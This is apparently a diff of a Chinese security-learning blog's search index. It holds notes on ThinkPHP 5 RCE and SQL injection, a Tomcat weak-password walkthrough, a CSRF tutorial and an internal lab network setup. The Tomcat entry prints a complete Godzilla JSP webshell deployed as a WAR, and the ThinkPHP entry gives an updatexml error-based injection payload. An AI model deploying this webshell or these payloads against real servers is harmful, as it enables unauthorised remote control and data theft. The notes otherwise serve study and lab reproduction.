class="line">route</span><br><span class="line">think\Route </span><br><span class="line">think\route\Rule</span><br><span class="line">think\route\RuleGroup</span><br><span class="line">think\route\Domain</span><br><span class="line">think\route\RuleItem</span><br><span class="line">think\route\RuleName</span><br><span class="line">think\route\Dispatch</span><br><span class="line">think\route\dispatch\Url</span><br><span class="line">think\route\dispatch\Module</span><br><span class="line">think\Middleware</span><br><span class="line">think\Cookie</span><br><span class="line">think\View</span><br><span class="line">think\view\driver\Think</span><br><span class="line">think\Template</span><br><span class="line">think\template\driver\File</span><br><span class="line">think\Session</span><br><span class="line">think\Debug</span><br><span class="line">think\Cache</span><br><span class="line">think\cache\Driver</span><br><span class="line">think\cache\driver\File</span><br></pre></td></tr></table></figure>
+<p>5.0 的有：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">think\Route</span><br><span class="line">think\Config</span><br><span class="line">think\Error</span><br><span class="line">think\App</span><br><span class="line">think\Request</span><br><span class="line">think\Hook</span><br><span class="line">think\Env</span><br><span class="line">think\Lang</span><br><span class="line">think\Log</span><br><span class="line">think\Loader</span><br></pre></td></tr></table></figure>
+<p>两个版本公有的是：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">think\Route </span><br><span class="line">think\Loader </span><br><span class="line">think\Error </span><br><span class="line">think\App </span><br><span class="line">think\Env </span><br><span class="line">think\Config </span><br><span class="line">think\Hook </span><br><span class="line">think\Lang </span><br><span class="line">think\Request </span><br><span class="line">think\Log</span><br></pre></td></tr></table></figure>
+<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>升级框架版本，新版本中修复了控制器的调用</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://xz.aliyun.com/t/3570">[漏洞分析]thinkphp 5.x全版本任意代码执行分析全记录</a></p>
+<p><a href="https://www.anquanke.com/post/id/252811#h3-7">ThinkPHP V5 漏洞复现</a></p>
 ]]></content>
-      <categories>
-        <category>Tomcat</category>
-      </categories>
       <tags>
-        <tag>Tomcat</tag>
+        <tag>thinkphp</tag>
       </tags>
   </entry>
   <entry>
@@ -1179,6 +1144,36 @@
       </tags>
   </entry>
   <entry>
+    <title>tomcat8 弱口令</title>
+    <url>/2021/09/09/tomcat8-%E5%BC%B1%E5%8F%A3%E4%BB%A4/</url>
+    <content><![CDATA[<h2 id="tomcat8-弱口令"><a href="#tomcat8-弱口令" class="headerlink" title="tomcat8 弱口令"></a>tomcat8 弱口令</h2><p>正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击</p>
+<p>用户权限在<code>conf/tomcat-users.xml</code>文件中配置</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;tomcat-users xmlns&#x3D;&quot;http:&#x2F;&#x2F;tomcat.apache.org&#x2F;xml&quot;</span><br><span class="line">              xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">              xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;tomcat.apache.org&#x2F;xml tomcat-users.xsd&quot;</span><br><span class="line">              version&#x3D;&quot;1.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-gui&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-script&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-jmx&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-status&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;admin-gui&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;admin-script&quot;&#x2F;&gt;</span><br><span class="line">    &lt;user username&#x3D;&quot;tomcat&quot; password&#x3D;&quot;tomcat&quot; roles&#x3D;&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot; &#x2F;&gt;</span><br><span class="line">    </span><br><span class="line">&lt;&#x2F;tomcat-users&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限</p>
+<p>docker搭建环境</p>
+<p><img src="https://i.loli.net/2021/09/10/A64IXcg2RTUEzie.png" alt="image-20210910170730975"></p>
+<p>访问<code>xxx:8080/manager/html</code>弱口令tomcat、tomcat登录</p>
+<p><img src="https://i.loli.net/2021/09/10/vzZhNtUiDgGwF1x.png" alt="image-20210910171611943"></p>
+<p>找到上传点</p>
+<p>哥斯拉默认配置生成111.jsp，新建111文件夹，压缩后修改后缀为war</p>
+<blockquote>
+<p>111.jsp</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%! String xc&#x3D;&quot;3c6e0b8a9c15224a&quot;; String pass&#x3D;&quot;pass&quot;; String md5&#x3D;md5(pass+xc); class X extends ClassLoader&#123;public X(ClassLoader z)&#123;super(z);&#125;public Class Q(byte[] cb)&#123;return super.defineClass(cb, 0, cb.length);&#125; &#125;public byte[] x(byte[] s,boolean m)&#123; try&#123;javax.crypto.Cipher c&#x3D;javax.crypto.Cipher.getInstance(&quot;AES&quot;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;&#125; public static String md5(String s) &#123;String ret &#x3D; null;try &#123;java.security.MessageDigest m;m &#x3D; java.security.MessageDigest.getInstance(&quot;MD5&quot;);m.update(s.getBytes(), 0, s.length());ret &#x3D; new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();&#125; catch (Exception e) &#123;&#125;return ret; &#125; public static String base64Encode(byte[] bs) throws Exception &#123;Class base64;String value &#x3D; null;try &#123;base64&#x3D;Class.forName(&quot;java.util.Base64&quot;);Object Encoder &#x3D; base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null);value &#x3D; (String)Encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64&#x3D;Class.forName(&quot;sun.misc.BASE64Encoder&quot;); Object Encoder &#x3D; base64.newInstance(); value &#x3D; (String)Encoder.getClass().getMethod(&quot;encode&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125; public static byte[] base64Decode(String bs) throws Exception &#123;Class base64;byte[] value &#x3D; null;try &#123;base64&#x3D;Class.forName(&quot;java.util.Base64&quot;);Object decoder &#x3D; base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);value &#x3D; (byte[])decoder.getClass().getMethod(&quot;decode&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64&#x3D;Class.forName(&quot;sun.misc.BASE64Decoder&quot;); Object decoder &#x3D; base64.newInstance(); value &#x3D; (byte[])decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125;%&gt;&lt;%try&#123;byte[] data&#x3D;base64Decode(request.getParameter(pass));data&#x3D;x(data, false);if (session.getAttribute(&quot;payload&quot;)&#x3D;&#x3D;null)&#123;session.setAttribute(&quot;payload&quot;,new X(this.getClass().getClassLoader()).Q(data));&#125;else&#123;request.setAttribute(&quot;parameters&quot;,data);java.io.ByteArrayOutputStream arrOut&#x3D;new java.io.ByteArrayOutputStream();Object f&#x3D;((Class)session.getAttribute(&quot;payload&quot;)).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));&#125; &#125;catch (Exception e)&#123;&#125;%&gt;</span><br></pre></td></tr></table></figure>
+<p>上传111.war，连接</p>
+<p><img src="https://i.loli.net/2021/09/10/m1JPLjuZ8y2A7Oe.png" alt="image-20210910175031855"></p>
+<p><img src="https://i.loli.net/2021/09/10/xYRn934CsoJLW6M.png" alt="image-20210910175133308"></p>
+]]></content>
+      <categories>
+        <category>Tomcat</category>
+      </categories>
+      <tags>
+        <tag>Tomcat</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>web基础学习</title>
     <url>/2021/07/05/web%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="web基础之信息收集"><a href="#web基础之信息收集" class="headerlink" title="web基础之信息收集"></a>web基础之信息收集</h1><h2 id="要收集的信息"><a href="#要收集的信息" class="headerlink" title="要收集的信息"></a>要收集的信息</h2><h3 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h3><p>whois查询和备案信息</p>
@@ -1204,6 +1199,95 @@
 <h4 id="留意社交动态"><a href="#留意社交动态" class="headerlink" title="留意社交动态"></a>留意社交动态</h4><p>照片中暴露的信息，水印、地理位置等信息</p>
 <p>照片的exif可能会有GPS和手机类型，图片内容特征</p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>thinkphp5 sql注入</title>
+    <url>/2021/10/28/thinkphp5-sql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="thinkphp5-sql注入-amp-信息泄露"><a href="#thinkphp5-sql注入-amp-信息泄露" class="headerlink" title="thinkphp5 sql注入&amp;信息泄露"></a>thinkphp5 sql注入&amp;信息泄露</h2><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>信息泄露&amp;不能子查询的（鸡肋）sql注入</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>5.0.13&lt;=ThinkPHP&lt;=5.0.15 、 5.1.0&lt;=ThinkPHP&lt;=5.1.5</p>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>直接访问是这样</p>
+<p><img src="https://i.loli.net/2021/10/28/rNP47KfJmdMLVps.png" alt="image-20211026111543241"></p>
+<p>爆出用户名密码</p>
+<p><code>index.php?ids[]=1&amp;ids[]=2</code></p>
+<p><img src="https://i.loli.net/2021/10/28/lPvxWIkJYdiaVbj.png" alt="image-20211026111723255"></p>
+<p>使用updatexml报错注入来回显敏感信息</p>
+<p><code>index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1</code></p>
+<p><img src="https://i.loli.net/2021/10/28/my1YX3SqfehV2Nl.png" alt="image-20211026112047944"></p>
+<p>另外存在信息泄露，还有pdo预编译的错误信息的数据库和的一些信息和账号密码，但是也连接上不，确认了开放了端口之后那应该是mysql没有配置外连</p>
+<p><img src="https://i.loli.net/2021/10/28/nuPNr4k5tVpLedH.png" alt="image-20211026112755952"></p>
+<p>如果将这里的<code>user()</code>替换为其他子查询语句就会报错，师傅的解释是</p>
+<p>预编译的确是mysql服务端进行的，但是预编译的过程是不接触数据的 ，也就是说不会从表中将真实数据取出来，所以使用子查询的情况下不会触发报错；虽然预编译的过程不接触数据，但类似user()这样的数据库函数的值还是将会编译进SQL语句，所以这里执行并爆了出来</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html">ThinkPHP5 SQL注入漏洞 &amp;&amp; PDO真/伪预处理分析</a></p>
+]]></content>
+      <tags>
+        <tag>thinkphp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网环境搭建</title>
+    <url>/2021/07/15/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<h1 id="基本内网环境搭建"><a href="#基本内网环境搭建" class="headerlink" title="基本内网环境搭建"></a>基本内网环境搭建</h1><h3 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h3><p>用的思科模拟器画的，连接的方法肯定有问题，也没有连通，只能大概了解（学会了一定改）</p>
+<p><img src="https://i.loli.net/2021/07/16/b4RUcqX2y8prB9l.png" alt="image-20210716122325331"></p>
+<p>pfSense(充当路由、防火墙)</p>
+<blockquote>
+<p> 基于FreeBSD，专为防火墙和路由器功能定制的开源版本</p>
+</blockquote>
+<p>直接选择<code>典型</code>添加<code>iso</code>镜像文件，进行创建</p>
+<p><img src="https://i.loli.net/2021/07/15/83iYPIeaX7dk9EZ.png" alt="image-20210715212155511"></p>
+<p>按顺序配置五个网卡</p>
+<p><img src="https://i.loli.net/2021/07/15/cIiqQey6FXjflD5.png" alt="image-20210715204928890"></p>
+<p><del>编辑里添加一下<code>iso</code>镜像文件</del></p>
+<p><del>等待网卡配置</del></p>
+<p>不用自定义安装直接</p>
+<p><img src="/2021/07/15/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210715211852671.png" alt="image-20210715211852671"></p>
+<p>这里为什么要设置为<code>192.168.229.253</code>？是因为<code>VMnet8</code>网卡的地址是<code>192.168.229.1</code>（网卡地址如果没有的话可以自己设置一个静态ip）</p>
+<p><img src="https://i.loli.net/2021/07/15/WcrRpSlfYFvO8zd.png" alt="image-20210715231253905"></p>
+<p>访问</p>
+<p><img src="/2021/07/15/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210715230832578.png" alt="image-20210715230832578"></p>
+<p><img src="/2021/07/15/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210715230843355.png" alt="image-20210715230843355"></p>
+<p><img src="https://i.loli.net/2021/07/15/Jr4YvDmiu1oMxaE.png" alt="image-20210715231538625"></p>
+<p>系统，常规设置中修改语言为中文</p>
+<p>网络接口，接口管理中添加三个接口，就是和虚拟机中设置的三个网卡相对应</p>
+<p><img src="https://i.loli.net/2021/07/16/KEPRadL135WwmgM.png" alt="image-20210716100449009"></p>
+<p>点击进入<code>OPT1</code>，启用接口，进行描述，选择IPv4类型为静态，并将IPv4地址设置为<code>172.16.1.254</code>，子网掩码为24位，保存配置–&gt;应用更改</p>
+<p><img src="https://i.loli.net/2021/07/16/K6A4bvPsLa8gjmX.png" alt="image-20210716100821857"></p>
+<p><code>OPT2</code>设置</p>
+<p><img src="https://i.loli.net/2021/07/16/oyip2gbzdH3fx7W.png" alt="image-20210716122518464"></p>
+<p>子网掩码的位数可以设置为8</p>
+<p><img src="https://i.loli.net/2021/07/16/OsZTFUKDYRBGy3H.png" alt="image-20210716123516667"></p>
+<p>分别添加<code>DMZ``OA``SERVER</code>规则策略</p>
+<p>防火墙–&gt;规则策略–&gt;添加–&gt;协议设置为<code>any</code></p>
+<p><img src="https://i.loli.net/2021/07/16/7gRYhTNWtjVU2Dz.png" alt="image-20210716123634964"></p>
+<h3 id="win-server-2012配置"><a href="#win-server-2012配置" class="headerlink" title="win server 2012配置"></a>win server 2012配置</h3><p>关闭防火墙</p>
+<p><img src="https://i.loli.net/2021/07/16/IJLlESr5npFYkxt.png" alt="image-20210716152633707"></p>
+<p>看图启动即可</p>
+<p><img src="https://i.loli.net/2021/07/16/ngqcdIQBjoRiuK2.png" alt="image-20210716153224867"></p>
+<p>配置ip地址</p>
+<p><img src="https://i.loli.net/2021/07/16/GOUnqcRQ8Wwavg3.png" alt="image-20210716170524052"></p>
+<p><img src="https://i.loli.net/2021/07/16/SpV1FGZL5cYyO3j.png" alt="image-20210716170621213"></p>
+<h3 id="win7配置"><a href="#win7配置" class="headerlink" title="win7配置"></a>win7配置</h3><p>设置一下ip地址和dns服务器，关闭防火墙</p>
+<p><img src="https://i.loli.net/2021/07/16/FTPyeKYgbX8fkHi.png" alt="image-20210716171409092"></p>
+<h3 id="win-server-2008配置"><a href="#win-server-2008配置" class="headerlink" title="win server 2008配置"></a>win server 2008配置</h3><p><img src="https://i.loli.net/2021/07/16/7VFYrJ3KBj4i2nZ.png" alt="image-20210716173951902"></p>
+<p>ping一下三个服务器测试一下连通性</p>
+<p><img src="https://i.loli.net/2021/07/16/HpR6wQzer4dnqXA.png" alt="image-20210716172349367"></p>
+<p>改了一下路由器接口的ip，都通了</p>
+<h3 id="设置DHCP为OA分配ip"><a href="#设置DHCP为OA分配ip" class="headerlink" title="设置DHCP为OA分配ip"></a>设置DHCP为OA分配ip</h3><p>系统服务–&gt;DHCP服务–&gt;OA</p>
+<p>还要设置网关为<code>192.168.1.254</code></p>
+<p><img src="https://i.loli.net/2021/07/16/ZckVML1FrsUTNfv.png" alt="image-20210716174450675"></p>
+<p> <del>后面我把win7调回自动分配ip但还是识别的<code>192.168.229</code>网段</del></p>
+<p>重启加重新配置了几次，自动识别可以了</p>
+<p><img src="https://i.loli.net/2021/07/16/eZqy4wPBUVS67vH.png" alt="image-20210716181223254"></p>
+<h3 id="更改防火墙规则只允许OA区上网"><a href="#更改防火墙规则只允许OA区上网" class="headerlink" title="更改防火墙规则只允许OA区上网"></a>更改防火墙规则只允许OA区上网</h3><p>防火墙–&gt;地址转换–&gt;出站</p>
+<p>改为<code>手动</code>，删除其他映射，只设置一个原地址为<code>192.168.1.0</code>的映射</p>
+<p><img src="https://i.loli.net/2021/07/16/pf1mlC3yDnXQGSY.png" alt="image-20210716175822922"></p>
+<p><img src="https://i.loli.net/2021/07/16/jYhwganJcfWIbrN.png" alt="image-20210716164808262"></p>
+]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>内网</tag>
+      </tags>
   </entry>
   <entry>
     <title>weblogic RCE CVE-2017-10271</title>
@@ -1318,72 +1402,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>内网环境搭建</title>
-    <url>/2021/07/15/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<h1 id="基本内网环境搭建"><a href="#基本内网环境搭建" class="headerlink" title="基本内网环境搭建"></a>基本内网环境搭建</h1><h3 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h3><p>用的思科模拟器画的，连接的方法肯定有问题，也没有连通，只能大概了解（学会了一定改）</p>
-<p><img src="https://i.loli.net/2021/07/16/b4RUcqX2y8prB9l.png" alt="image-20210716122325331"></p>
-<p>pfSense(充当路由、防火墙)</p>
-<blockquote>
-<p> 基于FreeBSD，专为防火墙和路由器功能定制的开源版本</p>
-</blockquote>
-<p>直接选择<code>典型</code>添加<code>iso</code>镜像文件，进行创建</p>
-<p><img src="https://i.loli.net/2021/07/15/83iYPIeaX7dk9EZ.png" alt="image-20210715212155511"></p>
-<p>按顺序配置五个网卡</p>
-<p><img src="https://i.loli.net/2021/07/15/cIiqQey6FXjflD5.png" alt="image-20210715204928890"></p>
-<p><del>编辑里添加一下<code>iso</code>镜像文件</del></p>
-<p><del>等待网卡配置</del></p>
-<p>不用自定义安装直接</p>
-<p><img src="/2021/07/15/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210715211852671.png" alt="image-20210715211852671"></p>
-<p>这里为什么要设置为<code>192.168.229.253</code>？是因为<code>VMnet8</code>网卡的地址是<code>192.168.229.1</code>（网卡地址如果没有的话可以自己设置一个静态ip）</p>
-<p><img src="https://i.loli.net/2021/07/15/WcrRpSlfYFvO8zd.png" alt="image-20210715231253905"></p>
-<p>访问</p>
-<p><img src="/2021/07/15/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210715230832578.png" alt="image-20210715230832578"></p>
-<p><img src="/2021/07/15/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210715230843355.png" alt="image-20210715230843355"></p>
-<p><img src="https://i.loli.net/2021/07/15/Jr4YvDmiu1oMxaE.png" alt="image-20210715231538625"></p>
-<p>系统，常规设置中修改语言为中文</p>
-<p>网络接口，接口管理中添加三个接口，就是和虚拟机中设置的三个网卡相对应</p>
-<p><img src="https://i.loli.net/2021/07/16/KEPRadL135WwmgM.png" alt="image-20210716100449009"></p>
-<p>点击进入<code>OPT1</code>，启用接口，进行描述，选择IPv4类型为静态，并将IPv4地址设置为<code>172.16.1.254</code>，子网掩码为24位，保存配置–&gt;应用更改</p>
-<p><img src="https://i.loli.net/2021/07/16/K6A4bvPsLa8gjmX.png" alt="image-20210716100821857"></p>
-<p><code>OPT2</code>设置</p>
-<p><img src="https://i.loli.net/2021/07/16/oyip2gbzdH3fx7W.png" alt="image-20210716122518464"></p>
-<p>子网掩码的位数可以设置为8</p>
-<p><img src="https://i.loli.net/2021/07/16/OsZTFUKDYRBGy3H.png" alt="image-20210716123516667"></p>
-<p>分别添加<code>DMZ``OA``SERVER</code>规则策略</p>
-<p>防火墙–&gt;规则策略–&gt;添加–&gt;协议设置为<code>any</code></p>
-<p><img src="https://i.loli.net/2021/07/16/7gRYhTNWtjVU2Dz.png" alt="image-20210716123634964"></p>
-<h3 id="win-server-2012配置"><a href="#win-server-2012配置" class="headerlink" title="win server 2012配置"></a>win server 2012配置</h3><p>关闭防火墙</p>
-<p><img src="https://i.loli.net/2021/07/16/IJLlESr5npFYkxt.png" alt="image-20210716152633707"></p>
-<p>看图启动即可</p>
-<p><img src="https://i.loli.net/2021/07/16/ngqcdIQBjoRiuK2.png" alt="image-20210716153224867"></p>
-<p>配置ip地址</p>
-<p><img src="https://i.loli.net/2021/07/16/GOUnqcRQ8Wwavg3.png" alt="image-20210716170524052"></p>
-<p><img src="https://i.loli.net/2021/07/16/SpV1FGZL5cYyO3j.png" alt="image-20210716170621213"></p>
-<h3 id="win7配置"><a href="#win7配置" class="headerlink" title="win7配置"></a>win7配置</h3><p>设置一下ip地址和dns服务器，关闭防火墙</p>
-<p><img src="https://i.loli.net/2021/07/16/FTPyeKYgbX8fkHi.png" alt="image-20210716171409092"></p>
-<h3 id="win-server-2008配置"><a href="#win-server-2008配置" class="headerlink" title="win server 2008配置"></a>win server 2008配置</h3><p><img src="https://i.loli.net/2021/07/16/7VFYrJ3KBj4i2nZ.png" alt="image-20210716173951902"></p>
-<p>ping一下三个服务器测试一下连通性</p>
-<p><img src="https://i.loli.net/2021/07/16/HpR6wQzer4dnqXA.png" alt="image-20210716172349367"></p>
-<p>改了一下路由器接口的ip，都通了</p>
-<h3 id="设置DHCP为OA分配ip"><a href="#设置DHCP为OA分配ip" class="headerlink" title="设置DHCP为OA分配ip"></a>设置DHCP为OA分配ip</h3><p>系统服务–&gt;DHCP服务–&gt;OA</p>
-<p>还要设置网关为<code>192.168.1.254</code></p>
-<p><img src="https://i.loli.net/2021/07/16/ZckVML1FrsUTNfv.png" alt="image-20210716174450675"></p>
-<p> <del>后面我把win7调回自动分配ip但还是识别的<code>192.168.229</code>网段</del></p>
-<p>重启加重新配置了几次，自动识别可以了</p>
-<p><img src="https://i.loli.net/2021/07/16/eZqy4wPBUVS67vH.png" alt="image-20210716181223254"></p>
-<h3 id="更改防火墙规则只允许OA区上网"><a href="#更改防火墙规则只允许OA区上网" class="headerlink" title="更改防火墙规则只允许OA区上网"></a>更改防火墙规则只允许OA区上网</h3><p>防火墙–&gt;地址转换–&gt;出站</p>
-<p>改为<code>手动</code>，删除其他映射，只设置一个原地址为<code>192.168.1.0</code>的映射</p>
-<p><img src="https://i.loli.net/2021/07/16/pf1mlC3yDnXQGSY.png" alt="image-20210716175822922"></p>
-<p><img src="https://i.loli.net/2021/07/16/jYhwganJcfWIbrN.png" alt="image-20210716164808262"></p>
-]]></content>
-      <categories>
-        <category>内网</category>
-      </categories>
-      <tags>
-        <tag>内网</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>常见web漏洞学习之xss学习</title>
     <url>/2021/07/11/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E4%B9%8Bxss%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="常见web漏洞学习之xss学习"><a href="#常见web漏洞学习之xss学习" class="headerlink" title="常见web漏洞学习之xss学习"></a>常见web漏洞学习之xss学习</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><blockquote>
@@ -1456,6 +1474,51 @@
       </tags>
   </entry>
   <entry>
+    <title>常见web漏洞学习之CSRF</title>
+    <url>/2021/07/14/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BCSRF/</url>
+    <content><![CDATA[<h1 id="csrf学习"><a href="#csrf学习" class="headerlink" title="csrf学习"></a>csrf学习</h1><p>跨站请求伪造</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或访问包含攻击代码的页面（钓鱼），在受害者不知情的情况下以受害者的身份向发送请求，从而完成非法操作。</p>
+<p>CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全</p>
+<blockquote>
+<p>与XSS最大区别就是csrf并没有盗取cookie而是直接利用</p>
+</blockquote>
+<p>图里解释很清楚了，就不赘述了</p>
+<p><img src="https://pic002.cnblogs.com/img/hyddd/200904/2009040916453171.jpg" alt="img"></p>
+<p>还是老生常谈的银行转账的问题</p>
+<p>已知受害者在银行以GET请求来完成银行转账的操作，<code>http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</code></p>
+<p>而攻击者构造的代码是</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://www.mybank.com/Transfer.php?toBankId</span>=<span class="string">11&amp;money</span>=<span class="string">1000</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当受害者登录银行，然后被钓鱼或是诱导点击了攻击者的链接，这样<img>以GET的方式进行了转账操作</p>
+<p>后面改进的示例就不列举了，大概总结就是<code>$_REQUEST</code>既可以获取get请求的数据，也可以获取post请求的数据，当后台使用<code>$_REQUEST</code>获取数据时还是存在无法区分</p>
+<blockquote>
+<p>在PHP中，可以使用$_GET和$_POST分别获取GET请求和POST请求的数据。在JAVA中，用于获取请求数据request一样存在不能区分GET请求数据和POST数据的问题</p>
+</blockquote>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>最好是有目标站点的CMS，在本地搭建并构造一下例如创建管理员，开放权限等数据包，通过钓鱼等手段诱导管理员点击，执行数据包；要是没有目标站点的cms，也可以尝试抓包构造一下，不过有一定难度</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>CSRF攻击是源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是<strong>来自于某个用户的浏览器</strong>，但却<strong>无法保证该请求是用户批准发送的</strong></p>
+<h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><h4 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer Check"></a>Referer Check</h4><ol>
+<li>验证http referer字段</li>
+</ol>
+<p>referer就是记录了请求的来源（同源策略）</p>
+<blockquote>
+<p>然而，这种方法并非万无一失。Referer  的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer  的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer  值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全</p>
+</blockquote>
+<p>因为服务器并不是什么时候都能取到Referer，也可以通过抓包修改进行绕过，所以也无法作为CSRF防御的主要手段。但是用Referer Check来监控CSRF攻击的发生，倒是一种可行的方法</p>
+<h4 id="Anti-CSRF-Token"><a href="#Anti-CSRF-Token" class="headerlink" title="Anti CSRF Token"></a>Anti CSRF Token</h4><ol start="2">
+<li>添加token并验证</li>
+</ol>
+<p>一致的做法是使用一个token（<strong>Anti CSRF Token</strong>）</p>
+<p>用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html">浅谈CSRF攻击方式</a></p>
+<p><a href="https://www.cnblogs.com/lsj-info/p/9479755.html">CSRF攻击原理以及防御方法</a></p>
+]]></content>
+      <categories>
+        <category>csrf</category>
+      </categories>
+      <tags>
+        <tag>csrf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>常见web漏洞学习之RCE</title>
     <url>/2021/07/20/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BRCE/</url>
     <content><![CDATA[<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>remote command/code execute</p>
@@ -1511,51 +1574,6 @@
       </categories>
       <tags>
         <tag>rce</tag>
